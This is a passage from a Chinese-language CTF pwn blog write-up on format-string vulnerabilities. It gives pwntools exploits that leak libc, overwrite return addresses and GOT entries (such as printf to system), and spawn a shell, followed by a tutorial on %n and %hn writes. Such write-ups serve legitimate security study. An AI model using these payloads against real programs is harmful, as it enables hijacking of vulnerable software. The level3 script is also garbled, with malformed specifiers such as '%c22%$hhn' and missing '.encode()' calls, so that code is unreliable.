字节</span></span><br><span class="line">payload += <span class="string">b&quot;%19$p&quot;</span>                 <span class="comment"># 泄露 __libc_start_main 地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr - <span class="number">8</span>)      <span class="comment"># 写入到 stack_addr - 8 的位置</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的 libc 地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leaked_libc = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leaked_libc - <span class="number">122</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 准备 one_gadget 并进行第二次格式化字符串写入 ================</span></span><br><span class="line">one_gadgets = [<span class="number">0xE3AFE</span>, <span class="number">0xE3B01</span>, <span class="number">0xE3B04</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串写入 gadget 地址（分两次写入两个 16 位）</span></span><br><span class="line">low = one_gadget &amp; <span class="number">0xFFFF</span></span><br><span class="line">high = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;low&#125;</span>c%10$hn&quot;</span>.encode()</span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;(high - low) &amp; <span class="number">0xFFFF</span>&#125;</span>c%11$hn&quot;</span>.encode()</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上写入两个地址：分别写入 gadget 地址的低位和高位</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span>)        <span class="comment"># 返回地址所在栈偏移</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span> + <span class="number">2</span>)    <span class="comment"># +2 写入高位部分</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 获取 Flag ================</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;cat f*&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span>          <span class="comment">#hex(4669) = 0x123d --&gt;read地址的后两字节</span></span><br><span class="line">payload += <span class="string">b&quot;%19$p&quot;</span>                <span class="comment">#泄露libc_start_main+地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr - <span class="number">8</span>)      <span class="comment">#p64(stack_addr - 8)----&gt;printf的返回地址</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.1.png" alt="1"></p>
<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.0.png" alt="1"></p>
<p>可以看到0x7fffffffdd08 &#x3D; 0x7fffffffdd10 - 0x08从而定位printf_ret的地址。</p>
<p>然后我们可以看到libc_start_main+122的地址在栈上的位置；</p>
<p>0x7fffffffdd78 - 0x7fffffffdd10 &#x3D; 104，104&#x2F;8  &#x3D; 13，此时我们用%19$p就可以泄露出libc_start_main+122的地址，再减去122就可以得到</p>
<p>libc_start_main地址，再用libc_start_main减去偏移就可以得到基地地址了。</p>
<p>然后再%4669c%11$hn进行两字节的写入。将printf_ret的地址改成read的地址。</p>
<p>用one_gdaget命令查execve(&#x2F;bin&#x2F;sh)的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ one_gadget libc.so.6</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadgets = [<span class="number">0xE3AFE</span>, <span class="number">0xE3B01</span>, <span class="number">0xE3B04</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串写入 gadget 地址（分两次写入两个 16 位）</span></span><br><span class="line">low = one_gadget &amp; <span class="number">0xFFFF</span>   <span class="comment">#低16位的两个字节</span></span><br><span class="line">high = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>  <span class="comment">#高16位的两个字节</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;low&#125;</span>c%10$hn&quot;</span>.encode()  <span class="comment">#把低16位的两个字节写入偏移为10的位置</span></span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;(high - low) &amp; <span class="number">0xFFFF</span>&#125;</span>c%11$hn&quot;</span>.encode()  <span class="comment">#把高16位的两个字节写入偏移为11的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上写入两个地址：分别写入 gadget 地址的低位和高位</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span>)        <span class="comment"># 返回地址所在栈偏移  偏移为10的位置</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span> + <span class="number">2</span>)    <span class="comment"># +2 写入高位部分 偏移为11的位置</span></span><br></pre></td></tr></table></figure>

<p>注释：11是怎么算出来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ ./pwn</span><br><span class="line">Welcome TGCTF!</span><br><span class="line">your gift 0x7ffeec1ae9c0</span><br><span class="line">please tell me your name</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0x7ffeec1ae9c0 0x30 0x7c484851ba61 0x18 (nil) 0x2070252061616161 0x7025207025207025 0x2520702520702520 0xa70252070252070</span><br></pre></td></tr></table></figure>

<p>偏移是6,0x28&#x2F;8 &#x3D; 5，5 + 6 &#x3D;11；</p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>写完这题就来总结一下格式化字符串的原理。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))init)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x110u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);   <span class="comment">//只有唯一的一个格式化字符串的漏洞，所以我们要构造一个循环</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040121B ; __unwind &#123;</span><br><span class="line">.text:000000000040121B                 endbr64</span><br><span class="line">.text:000000000040121F                 push    rbp</span><br><span class="line">.text:0000000000401220                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401223                 sub     rsp, 110h</span><br><span class="line">.text:000000000040122A                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000401233                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000401237                 xor     eax, eax</span><br><span class="line">.text:0000000000401239                 mov     eax, 0</span><br><span class="line">.text:000000000040123E                 call    init</span><br><span class="line">.text:0000000000401243                 lea     rax, s          ; &quot;-----&quot;</span><br><span class="line">.text:000000000040124A                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040124D                 call    _puts</span><br><span class="line">.text:0000000000401252                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401259                 mov     edx, 110h       ; nbytes</span><br><span class="line">.text:000000000040125E                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401261                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401266                 call    _read</span><br><span class="line">.text:000000000040126B                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401272                 mov     rdi, rax        ; format</span><br><span class="line">.text:0000000000401275                 mov     eax, 0</span><br><span class="line">.text:000000000040127A                 call    _printf</span><br><span class="line">.text:000000000040127F                 mov     eax, 0</span><br><span class="line">.text:0000000000401284                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:0000000000401288                 sub     rdx, fs:28h</span><br><span class="line">.text:0000000000401291                 jz      short locret_401298</span><br><span class="line">.text:0000000000401293                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>我们看到了call    ___stack_chk_fail，这个是关键。</p>
<p>为什么会有这个呢?  —–&gt;因为开启了canary</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      No RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br><span class="line">Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>查看保护，开启了canary。</p>
<p>利用格式化字符串的任意位置的篡改，我们就可以将 ___stack_chk_fail篡改为main的地址，这样就会进入无限循环</p>
<p>我们先去找到main和___stack_chk_fail的got地址，在篡改的同时还可以利用printf_got泄露printf的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main_addr = <span class="number">0x40121b</span></span><br><span class="line">stack_chk_fail_got = <span class="number">0x0403320</span></span><br><span class="line">printf_got = <span class="number">0x403328</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode + <span class="string">b&#x27;%c22%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x1b</span>)+(<span class="number">0x12</span>).encode + <span class="string">b&#x27;%c23%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x12</span>)+(<span class="number">0x40</span>).encode + <span class="string">b&#x27;%c24%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span> <span class="comment">#方便接收</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0x80/8 = 16 + 6(偏移见下图) = 22</span></span><br><span class="line">payload += p64(stack_chk_fail_got)       <span class="comment"># %$hhn是单字节写入 stack_chk_fail_got是%c22%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x1</span>) <span class="comment"># stack_chk_fail_got + 0x1是%c23%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x2</span>) <span class="comment"># stack_chk_fail_got + 0x2是%c24%$hhn写入的地址</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0x7ffcf57781d0 0x110 0x7a8a8171ba61 0x5 0x7a8a81904380 0x2070252061616161 0x7025207025207025 0x2520702520702520</span><br><span class="line">#偏移为6</span><br></pre></td></tr></table></figure>

<p>执行这个payload就进入无限循环了，并且泄漏量printf的地址。</p>
<p>根据print的地址，计算出libc的基地址。</p>
<p>此时我就要再次利用格式化字符串，将printf_got的地址改成system的地址，在发送&#x2F;bin&#x2F;sh就能获取shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;---b&quot;</span>)  </span><br><span class="line">printf_addr = u64(io.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)  <span class="comment">#接收printf的地址</span></span><br><span class="line">success(<span class="string">f&quot;printf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>) </span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>] <span class="comment">#计算基地址</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#算出system的地址</span></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&quot;c%22$hhn&quot;</span> <span class="comment">#最低字节写入偏移为的位置</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (system &amp; <span class="number">0xff</span>)) + ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&quot;c%23$hhn&quot;</span> <span class="comment">#同理去高一位的字节</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span> <span class="comment">#同理</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got) <span class="comment">#c%22$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x1</span>) <span class="comment">#c%23$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x2</span>) <span class="comment">#c%24$hhn写入的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)              </span><br><span class="line"><span class="comment">#io = remote(&#x27;ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x40121b</span></span><br><span class="line">stack_chk_fail_got = <span class="number">0x0403320</span></span><br><span class="line">printf_got = <span class="number">0x403328</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode + <span class="string">b&#x27;%c22%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x1b</span>)+(<span class="number">0x12</span>).encode + <span class="string">b&#x27;%c23%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x12</span>)+(<span class="number">0x40</span>).encode + <span class="string">b&#x27;%c24%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span> <span class="comment">#方便接收</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0x80/8 = 16 + 6(偏移见下图) = 22</span></span><br><span class="line">payload += p64(stack_chk_fail_got)       <span class="comment"># %$hhn是单字节写入 stack_chk_fail_got是%c22%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x1</span>) <span class="comment"># stack_chk_fail_got + 0x1是%c23%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x2</span>) <span class="comment"># stack_chk_fail_got + 0x2是%c24%$hhn写入的地址</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;---b&quot;</span>)  </span><br><span class="line">printf_addr = u64(io.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)  <span class="comment">#接收printf的地址</span></span><br><span class="line">success(<span class="string">f&quot;printf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>) </span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>] <span class="comment">#计算基地址</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#算出system的地址</span></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&quot;c%22$hhn&quot;</span> <span class="comment">#最低字节写入偏移为的位置</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (system &amp; <span class="number">0xff</span>)) + ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&quot;c%23$hhn&quot;</span> <span class="comment">#同理去高一位的字节</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span> <span class="comment">#同理</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got) <span class="comment">#c%22$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x1</span>) <span class="comment">#c%23$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x2</span>) <span class="comment">#c%24$hhn写入的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>现在开始格式化字符串漏洞的知识点的总结。</p>
<p>什么是格式化字符串？</p>
<ul>
<li>在 C&#x2F;C++ 等语言中，像 <code>printf</code>, <code>sprintf</code>, <code>fprintf</code>, <code>syslog</code> 等函数使用一个格式化字符串作为第一个参数。这个字符串包含普通文本和以 <code>%</code> 开头的格式化说明符。</li>
<li>函数根据格式化说明符的指示，从后续的参数列表中读取相应数量和类型的参数，并将它们格式化后输出到目标（屏幕、字符串、文件等）。</li>
</ul>
<p>漏洞成因：</p>
<ul>
<li>程序员错误： 当程序员允许用户输入直接作为格式化字符串传递给这些格式化输出函数时，漏洞就产生了。</li>
<li>关键区别：<ul>
<li>正确用法： <code>printf(&quot;%s&quot;, user_input);</code> - 用户输入被当作一个普通的字符串参数传递给 <code>%s</code>。函数期望一个字符串地址作为第二个参数。</li>
<li>漏洞用法： <code>printf(user_input);</code> - 用户输入本身被当作格式化字符串。如果用户输入中包含 <code>%</code> 开头的字符序列，函数会将其解释为格式化说明符。</li>
</ul>
</li>
<li>函数行为： 当遇到格式化说明符时，函数会假设在栈（或寄存器，取决于调用约定）上存在对应的参数。它就会按照格式化说明符的要求去读取内存中它“认为”是参数的位置。</li>
</ul>
<p>漏洞危害：</p>
<ul>
<li>信息泄露 (Read)：读取栈内存、函数返回地址、库函数地址、程序代码地址、Canary值、甚至任意地址的内容（如密码、密钥）。</li>
<li>内存覆写 (Write)：向栈内存、函数返回地址、全局偏移表 (GOT)、析构函数表 (DTORS)、任意地址写入数据，从而劫持程序控制流（执行任意代码）。</li>
<li>程序崩溃： 读取或写入无效地址导致段错误。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%s - 字符串读取 (Read)</span><br><span class="line"></span><br><span class="line">功能： 期望一个指针（地址）作为参数。函数从该地址开始读取内存，直到遇到空字符 (\0)，并将读取到的字节作为字符串输出。</span><br><span class="line"></span><br><span class="line">漏洞利用 (信息泄露)：</span><br><span class="line"></span><br><span class="line">泄露栈内容： printf(&quot;%s&quot;); - 函数会试图将当前栈上“它认为”是参数的位置（通常是格式化字符串指针后面的位置）解释为一个指针，并尝</span><br><span class="line"></span><br><span class="line">试读取该指针指向的内存。如果这个位置恰好包含一个有效的（或可读的）地址，就能泄露该地址处的字符串。例如：</span><br><span class="line"></span><br><span class="line">用户输入 &quot;%s&quot; -&gt; 程序崩溃或泄露栈上某个地址处的数据。</span><br><span class="line"></span><br><span class="line">用户输入 &quot;AAAA%x%x%x%s&quot; -&gt; 先泄露几个栈值 (%x)，然后用其中一个值作为指针 (%s) 去读内存。</span><br><span class="line"></span><br><span class="line">泄露任意地址内容 (结合偏移)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;格式化字符串&gt;</span><br><span class="line"></span><br><span class="line">利用 %k$s (其中 k 是偏移量) 指定将栈上第 k 个参数当作指针，用 %s 去读取。例如：</span><br><span class="line"></span><br><span class="line">假设 &lt;目标地址&gt; 被放置在栈上第 8 个参数的位置。</span><br><span class="line"></span><br><span class="line">Payload: &quot;\x78\x56\x34\x12%8$s&quot; (假设 0x12345678 是目标地址，小端序写入)。</span><br><span class="line"></span><br><span class="line">printf 看到 %8$s，就会把栈上第 8 个位置的值 0x12345678 当作指针，读取该地址处的字符串并输出。</span><br><span class="line"></span><br><span class="line">关键点： %s 是读取目标地址指向的内存内容（直到 \0），不是读取地址本身的值。地址本身通常需要用 %p 或 %x 泄露。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%n - 写入已打印字符数 (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 int *（指向整数的指针）作为参数。该功能是漏洞实现任意地址写的核心！ 函数将到目前为止已成功输出的字符总数写入到</span><br><span class="line">这个指针指向的内存位置。</span><br><span class="line"></span><br><span class="line">漏洞利用 (内存覆写)：</span><br><span class="line"></span><br><span class="line">覆写栈变量/指针/返回地址： printf(&quot;AAAA%n&quot;); - 函数试图将已打印的字符数 (4个 A，所以是4) 写入到栈上“它认为”是参数的位置（本</span><br><span class="line">该是一个 int * 的地方）。如果该位置可写，值 4 就被写入了。这通常会导致崩溃或意外行为。</span><br><span class="line"></span><br><span class="line">覆写任意地址 (结合偏移)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;填充字符&gt;&lt;%k$n&gt; 或 &lt;填充字符&gt;&lt;%k$n&gt;&lt;目标地址&gt; (取决于目标地址在栈上的位置)。</span><br><span class="line"></span><br><span class="line">利用 %k$n 指定将栈上第 k 个参数当作 int *，并将已打印字符数写入该地址。</span><br><span class="line"></span><br><span class="line">例如，要写 0xdeadbeef (4字节) 到地址 0x0804a000：</span><br><span class="line"></span><br><span class="line">需要先打印 0xdeadbeef (3, 737, 519, 343) 个字符？这几乎不可能，因为数字太大。</span><br><span class="line"></span><br><span class="line">解决方案： 使用 %hn 或 %hhn 分多次写 2 字节或 1 字节。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%hn - 写入已打印字符数 (短整型 - 2字节) (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 short int *（指向短整型的指针）作为参数。将到目前为止已成功输出的字符总数（只取其低 16 位）写入到这个指针指向的内存位置（写入 2 个字节）。</span><br><span class="line"></span><br><span class="line">为什么重要？ 要写入的值（如地址、Shellcode 地址）通常很大（4字节或8字节）。一次性用 %n 写入一个巨大的数字（如 0x0804a000 = </span><br><span class="line">134, 520, 832）需要构造极长的输出字符串，不现实且容易出错。%hn 允许我们分两次写入一个 4 字节值（高 16 位和低 16 位）或四次写</span><br><span class="line">入一个 8 字节值。</span><br><span class="line"></span><br><span class="line">漏洞利用 (精确内存覆写)：</span><br><span class="line"></span><br><span class="line">覆写任意地址的 2 字节 (Word)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;填充字符&gt;&lt;%k$hn&gt;</span><br><span class="line"></span><br><span class="line">%k$hn 将已打印字符数（模 65536）的低 16 位写入到第 k 个参数指向的地址（2字节）。</span><br><span class="line"></span><br><span class="line">覆写任意地址的 4 字节 (Dword - 常用)：</span><br><span class="line"></span><br><span class="line">假设目标地址是 0x0804a000 (要写入的值 val = 0xdeadbeef)。</span><br><span class="line"></span><br><span class="line">将地址拆分为高 16 位 (high = 0xdead) 和低 16 位 (low = 0xbeef)。</span><br><span class="line"></span><br><span class="line">方法 1 (地址连续)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr_low&gt;&lt;addr_high&gt;&lt;填充使总字符数=low&gt;&lt;%m$hn&gt;&lt;填充使总字符数=high&gt;&lt;%n$hn&gt; (注意 low 和 high 可能小于之前打印</span><br><span class="line">的字符数，需要用模运算调整)</span><br><span class="line"></span><br><span class="line">其中 m 是 addr_low 在栈上的位置偏移，n 是 addr_high 在栈上的位置偏移（通常 n = m + 1 或 n = m + 2，取决于指针大小）。</span><br><span class="line"></span><br><span class="line">第一个 %m$hn 将 low 写入 addr_low 指向的地址（即 0x0804a000）。</span><br><span class="line"></span><br><span class="line">第二个 %n$hn 将 high 写入 addr_high 指向的地址（即 0x0804a000 + 2 = 0x0804a002）。</span><br><span class="line"></span><br><span class="line">方法 2 (地址重叠 - 更紧凑)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr&gt;&lt;填充使总字符数=low&gt;&lt;%m$hn&gt;&lt;填充使总字符数=high&gt;&lt;%m$hn&gt; (但这次 addr 指向 0x0804a000)</span><br><span class="line"></span><br><span class="line">第一个 %m$hn 将 low (0xbeef) 写入 addr (0x0804a000)。</span><br><span class="line"></span><br><span class="line">第二个 %m$hn 会再次写入 addr (0x0804a000)。但此时已打印字符数是 low + padding_for_high = 0xbeef + ... = high (假设填充计</span><br><span class="line">算正确)，所以将 high (0xdead) 写入 0x0804a000。覆盖了之前写入的低位！</span><br><span class="line"></span><br><span class="line">错误！ 需要写入 addr (0x0804a000) 和 addr+2 (0x0804a002)。方法 2 不正确。</span><br><span class="line"></span><br><span class="line">正确方法 2 (两个不同地址)：</span><br><span class="line"></span><br><span class="line">Payload: 